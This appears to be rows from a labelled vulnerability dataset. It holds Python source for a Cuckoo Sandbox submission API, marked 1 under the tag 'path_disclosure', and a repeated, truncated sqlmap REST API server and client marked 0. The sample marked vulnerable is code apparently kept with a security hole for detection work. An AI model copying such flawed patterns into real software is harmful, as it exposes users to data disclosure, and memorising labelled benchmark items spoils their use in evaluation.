/n/n/n/cuckoo/web/controllers/submission/api.py/n/n# Copyright (C) 2010-2013 Claudio Guarnieri.
# Copyright (C) 2014-2017 Cuckoo Foundation.
# This file is part of Cuckoo Sandbox - http://www.cuckoosandbox.org
# See the file 'docs/LICENSE' for copying permission.

import json

from django.http import JsonResponse
from django.shortcuts import redirect
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods

from cuckoo.common.config import config
from cuckoo.core.submit import SubmitManager
from cuckoo.web.bin.utils import api_post, JsonSerialize, json_error_response

submit_manager = SubmitManager()

def defaults():
    machinery = config(""cuckoo:cuckoo:machinery"")

    if config(""routing:vpn:enabled""):
        vpns = config(""routing:vpn:vpns"")
    else:
        vpns = []

    return {
        ""machine"": config(""%s:%s:machines"" % (machinery, machinery)),
        ""package"": None,
        ""priority"": 2,
        ""timeout"": config(""cuckoo:timeouts:default""),
        ""routing"": {
            ""route"": config(""routing:routing:route""),
            ""inetsim"": config(""routing:inetsim:enabled""),
            ""tor"": config(""routing:tor:enabled""),
            ""vpns"": vpns,
        },
        ""options"": {
            ""enable-services"": False,
            ""enforce-timeout"": False,
            ""full-memory-dump"": config(""cuckoo:cuckoo:memory_dump""),
            ""no-injection"": False,
            ""process-memory-dump"": True,
            ""simulated-human-interaction"": True,
        },
    }

class SubmissionApi(object):
    @staticmethod
    @csrf_exempt
    @require_http_methods([""POST""])
    def presubmit(request):
        files = request.FILES.getlist(""files[]"")
        data = []

        if files:
            for f in files:
                data.append({
                    ""name"": f.name,
                    ""data"": f.file,
                })

            submit_id = submit_manager.pre(submit_type=""files"", data=data)
            return redirect(""submission/pre"", submit_id=submit_id)
        else:
            body = json.loads(request.body)
            submit_type = body[""type""]

            if submit_type != ""strings"":
                return json_error_response(""type not \""strings\"""")

            submit_id = submit_manager.pre(
                submit_type=submit_type, data=body[""data""].split(""\n"")
            )

            return JsonResponse({
                ""status"": True,
                ""submit_id"": submit_id,
            }, encoder=JsonSerialize)

    @api_post
    def get_files(request, body):
        submit_id = body.get(""submit_id"", 0)
        password = body.get(""password"", None)
        astree = body.get(""astree"", True)

        data = submit_manager.get_files(
            submit_id=submit_id,
            password=password,
            astree=astree
        )

        return JsonResponse({
            ""status"": True,
            ""data"": data,
            ""defaults"": defaults(),
        }, encoder=JsonSerialize)

    @api_post
    def submit(request, body):
        submit_id = body.pop(""submit_id"", None)
        submit_manager.submit(
            submit_id=submit_id, config=body
        )
        return JsonResponse({
            ""status"": True,
            ""submit_id"": submit_id,
        }, encoder=JsonSerialize)
/n/n/n",1,path_disclosure
14,56,b4bb4c393b26072b9a47f787be134888b983af60,"lib/utils/api.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
""""""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = """"
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who=""server""):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug(""REST-JSON API %s connected to IPC database"" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not ""locked"" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith(""SELECT""):
            return self.cursor.fetchall()

    def init(self):
        self.execute(""CREATE TABLE logs(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, time TEXT, ""
                  ""level TEXT, message TEXT""
                  "")"")

        self.execute(""CREATE TABLE data(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, status INTEGER, ""
                  ""content_type INTEGER, value TEXT""
                  "")"")

        self.execute(""CREATE TABLE errors(""
                    ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                    ""taskid INTEGER, error TEXT""
                    "")"")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {""boolean"": False, ""string"": None, ""integer"": None, ""float"": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists(""sqlmap.py""):
            self.process = Popen([""python"", ""sqlmap.py"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen([""sqlmap"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype=""stdout""):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == ""stdout"":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == ""stdout"":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                ""SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?"",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute(""DELETE FROM data WHERE id = ?"",
                                                     (output[index][0],))

                conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = ""%s%s"" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute(""UPDATE data SET value = ? WHERE id = ?"",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute(""INSERT INTO errors VALUES(NULL, ?, ?)"",
                                         (self.taskid, str(value) if value else """"))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """"""
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """"""
        conf.database_cursor.execute(""INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)"",
                                     (conf.taskid, time.strftime(""%X""), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, ""api""):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect(""client"")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, ""%s ('%s')"" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook(""after_request"")
def security_headers(json_header=True):
    """"""
    Set some headers across all HTTP responses
    """"""
    response.headers[""Server""] = ""Server""
    response.headers[""X-Content-Type-Options""] = ""nosniff""
    response.headers[""X-Frame-Options""] = ""DENY""
    response.headers[""X-XSS-Protection""] = ""1; mode=block""
    response.headers[""Pragma""] = ""no-cache""
    response.headers[""Cache-Control""] = ""no-cache""
    response.headers[""Expires""] = ""0""
    if json_header:
        response.content_type = ""application/json; charset=UTF-8""

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return ""Access denied""


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return ""Nothing here""


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return ""Method not allowed""


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return ""Internal server error""

#############################
# Task management functions #
#############################


# Users' methods
@get(""/task/new"")
def task_new():
    """"""
    Create new task ID
    """"""
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug(""Created new task: '%s'"" % taskid)
    return jsonize({""success"": True, ""taskid"": taskid})


@get(""/task/<taskid>/delete"")
def task_delete(taskid):
    """"""
    Delete own task ID
    """"""
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug(""[%s] Deleted task"" % taskid)
        return jsonize({""success"": True})
    else:
        logger.warning(""[%s] Invalid task ID provided to task_delete()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

###################
# Admin functions #
###################


@get(""/admin/<taskid>/list"")
def task_list(taskid=None):
    """"""
    List task pull
    """"""
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))[""status""]

    logger.debug(""[%s] Listed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True, ""tasks"": tasks, ""tasks_num"": len(tasks)})

@get(""/admin/<taskid>/flush"")
def task_flush(taskid):
    """"""
    Flush task spool (delete all tasks)
    """"""

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug(""[%s] Flushed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get(""/option/<taskid>/list"")
def option_list(taskid):
    """"""
    List options for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_list()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    logger.debug(""[%s] Listed task options"" % taskid)
    return jsonize({""success"": True, ""options"": DataStore.tasks[taskid].get_options()})


@post(""/option/<taskid>/get"")
def option_get(taskid):
    """"""
    Get the value of an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_get()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    option = request.json.get(""option"", """")

    if option in DataStore.tasks[taskid].options:
        logger.debug(""[%s] Retrieved value for option %s"" % (taskid, option))
        return jsonize({""success"": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug(""[%s] Requested value for unknown option %s"" % (taskid, option))
        return jsonize({""success"": False, ""message"": ""Unknown option"", option: ""not set""})


@post(""/option/<taskid>/set"")
def option_set(taskid):
    """"""
    Set an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_set()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug(""[%s] Requested to set options"" % taskid)
    return jsonize({""success"": True})


# Handle scans
@post(""/scan/<taskid>/start"")
def scan_start(taskid):
    """"""
    Launch a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_start()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug(""[%s] Started scan"" % taskid)
    return jsonize({""success"": True, ""engineid"": DataStore.tasks[taskid].engine_get_id()})


@get(""/scan/<taskid>/stop"")
def scan_stop(taskid):
    """"""
    Stop a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_stop()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_stop()

    logger.debug(""[%s] Stopped scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/kill"")
def scan_kill(taskid):
    """"""
    Kill a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_kill()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_kill()

    logger.debug(""[%s] Killed scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/status"")
def scan_status(taskid):
    """"""
    Returns status of a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_status()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if DataStore.tasks[taskid].engine_process() is None:
        status = ""not running""
    else:
        status = ""terminated"" if DataStore.tasks[taskid].engine_has_terminated() is True else ""running""

    logger.debug(""[%s] Retrieved scan status"" % taskid)
    return jsonize({
        ""success"": True,
        ""status"": status,
        ""returncode"": DataStore.tasks[taskid].engine_get_returncode()
    })


@get(""/scan/<taskid>/data"")
def scan_data(taskid):
    """"""
    Retrieve the data of a scan
    """"""
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_data()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            ""SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_data_message.append(
            {""status"": status, ""type"": content_type, ""value"": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            ""SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug(""[%s] Retrieved scan data and error messages"" % taskid)
    return jsonize({""success"": True, ""data"": json_data_message, ""error"": json_errors_message})


# Functions to handle scans' logs
@get(""/scan/<taskid>/log/<start>/<end>"")
def scan_log_limited(taskid, start, end):
    """"""
    Retrieve a subset of log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning(""[%s] Invalid start or end value provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid start or end value, must be digits""})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            (""SELECT time, level, message FROM logs WHERE ""
             ""taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC""),
            (taskid, start, end)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages subset"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


@get(""/scan/<taskid>/log"")
def scan_log(taskid):
    """"""
    Retrieve the log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ""SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC"", (taskid,)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


# Function to handle files inside the output directory
@get(""/download/<taskid>/<target>/<filename:path>"")
def download(taskid, target, filename):
    """"""
    Download a certain file from the file system
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to download()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    path = os.path.abspath(os.path.join(paths.SQLMAP_OUTPUT_PATH, target, filename))
    # Prevent file path traversal
    if not path.startswith(paths.SQLMAP_OUTPUT_PATH):
        logger.warning(""[%s] Forbidden path (%s)"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""Forbidden path""})

    if os.path.isfile(path):
        logger.debug(""[%s] Retrieved content of file %s"" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({""success"": True, ""file"": file_content.encode(""base64"")})
    else:
        logger.warning(""[%s] File does not exist %s"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""File does not exist""})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """"""
    REST-JSON API server
    """"""
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix=""sqlmapipc-"", text=False)[1]

    logger.info(""Running REST-JSON API server at '%s:%d'.."" % (host, port))
    logger.info(""Admin ID: %s"" % DataStore.admin_id)
    logger.debug(""IPC database: %s"" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == ""gevent"":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == ""eventlet"":
            import eventlet
            eventlet.monkey_patch()
        logger.debug(""Using adapter '%s' to run bottle"" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if ""already in use"" in getSafeExString(ex):
            logger.error(""Address already in use ('%s:%s')"" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = ""Adapter '%s' is not available on this system"" % adapter
        if adapter in (""gevent"", ""eventlet""):
            errMsg += "" (e.g.: 'sudo apt-get install python-%s')"" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug(""Calling %s"" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error(""Failed to load and parse %s"" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """"""
    REST-JSON API client
    """"""

    dbgMsg = ""Example client access from command line:""
    dbgMsg += ""\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid"" % (host, port)
    dbgMsg += ""\n\t$ curl -H \""Content-Type: application/json\"" -X POST -d '{\""url\"": \""http://testphp.vulnweb.com/artists.php?artist=1\""}' http://%s:%d/scan/$taskid/start"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/data"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/log"" % (host, port)
    logger.debug(dbgMsg)

    addr = ""http://%s:%d"" % (host, port)
    logger.info(""Starting REST-JSON API client to '%s'..."" % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = ""There has been a problem while connecting to the ""
            errMsg += ""REST-JSON API server at '%s' "" % addr
            errMsg += ""(%s)"" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info(""Type 'help' or '?' for list of available commands"")

    while True:
        try:
            command = raw_input(""api%s> "" % ("" (%s)"" % taskid if taskid else """")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in (""data"", ""log"", ""status"", ""stop"", ""kill""):
            if not taskid:
                logger.error(""No task ID in use"")
                continue
            raw = _client(""%s/scan/%s/%s"" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            dataToStdout(""%s\n"" % raw)

        elif command.startswith(""new""):
            if ' ' not in command:
                logger.error(""Program arguments are missing"")
                continue

            argv = [""sqlmap.py""] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client(""%s/task/new"" % addr)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to create new task"")
                continue
            taskid = res[""taskid""]
            logger.info(""New task ID is '%s'"" % taskid)

            raw = _client(""%s/scan/%s/start"" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to start scan"")
                continue
            logger.info(""Scanning started"")

        elif command.startswith(""use""):
            taskid = (command.split()[1] if ' ' in command else """").strip(""'\"""")
            if not taskid:
                logger.error(""Task ID is missing"")
                taskid = None
                continue
            elif not re.search(r""\A[0-9a-fA-F]{16}\Z"", taskid):
                logger.error(""Invalid task ID '%s'"" % taskid)
                taskid = None
                continue
            logger.info(""Switching to task ID '%s' "" % taskid)

        elif command in (""list"", ""flush""):
            raw = _client(""%s/admin/%s/%s"" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            elif command == ""flush"":
                taskid = None
            dataToStdout(""%s\n"" % raw)

        elif command in (""exit"", ""bye"", ""quit"", 'q'):
            return

        elif command in (""help"", ""?""):
            msg =  ""help        Show this help message\n""
            msg += ""new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \""http://testphp.vulnweb.com/artists.php?artist=1\""')\n""
            msg += ""use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n""
            msg += ""data        Retrieve and show data for current task\n""
            msg += ""log         Retrieve and show log for current task\n""
            msg += ""status      Retrieve and show status for current task\n""
            msg += ""stop        Stop current task\n""
            msg += ""kill        Kill current task\n""
            msg += ""list        Display all tasks\n""
            msg += ""flush       Flush tasks (delete all tasks)\n""
            msg += ""exit        Exit this client\n""

            dataToStdout(msg)

        elif command:
            logger.error(""Unknown command '%s'"" % command)
/n/n/n",0,path_disclosure
15,57,b4bb4c393b26072b9a47f787be134888b983af60,"/lib/utils/api.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
""""""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = """"
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who=""server""):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug(""REST-JSON API %s connected to IPC database"" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not ""locked"" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith(""SELECT""):
            return self.cursor.fetchall()

    def init(self):
        self.execute(""CREATE TABLE logs(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, time TEXT, ""
                  ""level TEXT, message TEXT""
                  "")"")

        self.execute(""CREATE TABLE data(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, status INTEGER, ""
                  ""content_type INTEGER, value TEXT""
                  "")"")

        self.execute(""CREATE TABLE errors(""
                    ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                    ""taskid INTEGER, error TEXT""
                    "")"")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {""boolean"": False, ""string"": None, ""integer"": None, ""float"": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists(""sqlmap.py""):
            self.process = Popen([""python"", ""sqlmap.py"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen([""sqlmap"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype=""stdout""):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == ""stdout"":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == ""stdout"":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
